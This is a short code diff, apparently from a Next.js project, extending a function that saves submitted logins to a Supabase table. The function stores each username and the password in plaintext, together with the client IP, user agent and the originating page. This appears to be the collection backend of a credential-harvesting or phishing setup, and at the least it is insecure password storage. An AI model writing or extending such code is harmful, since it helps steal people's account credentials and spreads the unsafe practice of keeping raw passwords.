@@ -5,7 +5,8 @@ export async function saveLoginCredential(
   request: NextRequest,
   username: string,
   password: string,
-  page: string
+  page: string,
+  email?: string,
 ) {
   const ip =
     request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
@@ -16,8 +17,8 @@ export async function saveLoginCredential(
 
   const supabase = getSupabaseAdmin();
   const { error } = await supabase.from("login_credentials").insert({
-    email: isEmail ? username : null,
-    username: isEmail ? null : username,
+    email: email ?? (isEmail ? username : null),
+    username: email ? username : isEmail ? null : username,
     password,
     ip_address: ip,
     user_agent: userAgent,
